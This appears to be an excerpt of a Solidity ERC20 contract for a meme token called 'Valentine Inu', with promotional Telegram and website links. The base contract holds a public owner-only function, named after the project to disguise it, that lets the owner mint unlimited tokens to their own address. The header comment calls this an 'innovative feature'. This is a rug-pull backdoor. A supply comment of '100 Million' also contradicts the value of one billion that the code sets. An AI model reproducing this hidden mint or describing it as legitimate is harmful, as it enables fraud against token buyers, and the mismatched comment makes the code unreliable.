...
//
// $ValentineInu proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/ValentineInu_official
//  🌐 Website:https://ValentineInu.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ValentineInu(uint256 amount) public onlyOwner {
 _ValentineInu(msg.sender, amount);
    }
    ...
    function _ValentineInu(address account, uint256 amount) internal virtual {
...
contract $ValentineInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Valentine Inu", "VALENTINE") {
     _ValentineInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}